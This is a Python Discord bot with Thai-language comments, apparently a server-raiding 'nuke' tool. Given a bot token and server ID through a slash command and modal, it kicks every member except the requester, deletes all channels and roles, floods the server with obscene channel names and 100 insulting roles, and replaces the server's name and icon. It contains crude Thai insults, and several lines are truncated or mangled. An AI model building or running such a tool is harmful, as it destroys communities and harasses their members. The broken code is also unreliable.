import discord
from discord.ext import commands
import asyncio
import aiohttp

TOKEN = ""

intents = discord.Intents.default()
intents.members = Pbcc
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

ANNOUNCE_CHANNEL_ID = 1454516636953481348

# =========================
# ฟังก์ชัน reset_full.py ฝังในตัว
# =========================
async def reset_full_script(TOKEN: str, GUILD_ID: int, user_to_exclude):
    SERVER_ICON_URL = "https://images.pexels.com/photos/1839564/pexels-photo-1839564.jp>
    NEW_SERVER_NAME = "EZ CHICKEN"
    ROLE_NAME = "ควายโง่ดิสกระจอก"
    DELAY = 0.001

    intents_inner = discord.Intents.default()
    intents_inner.members = True
    intents_inner.guilds = True
    client_inner = discord.Client(intents=intents_inner)

    @client_inner.event
    async def on_ready():
        guild = client_inner.get_guild(GUILD_ID)
        if not guild:
            print("ไม่พบบอทในเซิร์ฟนี้ไอ้ควาย")
            await client_inner.close()
            return

        print(f"เริ่มทำลายล้างเซิฟร์: {guild.name}")
        channels = list(guild.channels)
        total = len(channels)
        print(f"พบ {total} ช่อง กำลังลบ...")

        for member in guild.members:
            if member.id != user_to_exclude.id:
                try:
                    await member.kick(reason="โดน reset เซิร์ฟ")
                    print("ออก:", member.name)
                    await asyncio.sleep(DELAY)
                except Exception as e:
                    print("ออกไม่ได้:", member.name, e)

        for ch in channels:
            try:
                await ch.delete(reason="Full reset")
                print("ลบ:", ch.name)
                await asyncio.sleep(DELAY)
            except Exception as e:
                print("ข้าม:", ch.name, e)

        for i in range(1, total + 1):
            try:
                await guild.create_text_channel(f"{i}ดิสกระจอกวะไอ้พวกเบียวหน้าหี", reason=">
                print("สร้าง:", f"{i}ดิสกระจอกวะไอ้พวกเบียวหน้าหี")
                await asyncio.sleep(DELAY)
            except Exception as e:
                print("สร้างไม่ได้:", e)

        roles = list(guild.roles)
        for role in roles:
            if role != guild.default_role:  # ยกเว้น @everyone
yone
           try:
                    await role.delete(reason="Full reset")
                    print("ลบยศ:", role.name)
                    await asyncio.sleep(DELAY)
                except Exception as e:
                    print("ลบยศไม่ได้:", role.name, e)

        for i in range(100):
            try:
                  await guild.create_role(name=ROLE_NAME, reason="Full reset")
                print("สร้างยศ:", ROLE_NAME)
                await asyncio.sleep(DELAY)
            except Exception as e:
                print("สร้างยศไม่ได้:", e)

        try:
            await guild.edit(name=NEW_SERVER_NAME)
            print("เปลี่ยนชื่อเซิร์ฟเรียบร้อย")
        except Exception as e:
            print("เปลี่ยนชื่อไม่ได้:", e)

        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(SERVER_ICON_URL) as resp:
                    if resp.status == 200:
                        data = await resp.read()
                        await guild.edit(icon=data, reason="Full reset")
                        print("เปลี่ยนรูปเซิฟร์เรียบร้อย")
                    else:
                        print("โหลดรูปไม่ได้")
        except Exception as e:
            print("เปลี่ยนรูปไม่ได้:", e)

        print("ทำลายเสร็จละไอ้ควาย")
        await client_inner.close()

    # แทน client_inner.run() ให้ใช้ create_task() + start()
    asyncio.create_task(client_inner.start(TOKEN))

# =========================
# Modal ใส่ Token + Server ID
# =========================
class ShootModal(discord.ui.Modal, title="ยิงดิสยศ"):
    token = discord.ui.TextInput(
        label="โทเค็นบอทตัวที่จะไช้ยิงและอยู่ในดิสนั้น",
        style=discord.TextStyle.short,
        required=True
    )
    server_id = discord.ui.TextInput(
        label="ไอดีเซิฟร์",
        style=discord.TextStyle.short,
        required=True
    )

    async def on_submit(self, interaction: discord.Interaction):
        token = self.token.value
        server_id = int(self.server_id.value)

        # ตอบผู้ใช้แบบส่วนตัว
        await interaction.response.send_message("กำลังถล่มดิสมันรอแปบดิ2.5วิ", ephemeral=True)

        # ประกาศในช่องคงที่
        channel = interaction.guild.get_channel(ANNOUNCE_CHANNEL_ID)
        if channel:
            await channel.send(f"ผู้ใช้ {interaction.user.mention} กำลังยิงเซิฟร์ที่ ID `{server>

        # รอ 3.7 วิ
        await asyncio.sleep(2.5)

        # รันสคริปต์ฝังในตัว
        asyncio.create_task(reset_full_script(token, server_id, interaction.user))

# =========================
# View + Button
# =========================
class ShootView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(
        label="ยิงดิสไช้บอท",
        style=discord.ButtonStyle.danger
    )
    async def shoot_button(self, interaction: discord.Interaction, button: discord.ui.B>
        await interaction.response.send_modal(ShootModal())

# =========================
# Slash Command
# =========================
@bot.tree.command(
    name="ยิงดิสยศ",
    description="กดปุ่มเพื่อยิง"
)
async def shoot(interaction: discord.Interaction):
    embed = discord.Embed(
        title="ระบบยิงดิสไช้บอทโดยเพียงแค่มีบอทเราในดิสนั้นและบอทเรามีสิธผู้ดูแลหรืออะไรที่ลบช่องสร้างได้",
        description="กดปุ่มสีแดงที่มึงตาบอดสีแล้วไส่โทเค็นกับไอดีดิสนั้นนะควาย",
        color=0x2f3136
    )
    await interaction.response.send_message(embed=embed, view=ShootView(), ephemeral=Fa>

# =========================
# Ready
# =========================
@bot.event
async def on_ready():
    await bot.tree.sync()
    print("พร้อมแล้ว ไอ้สัส!")

bot.run(TOKEN)
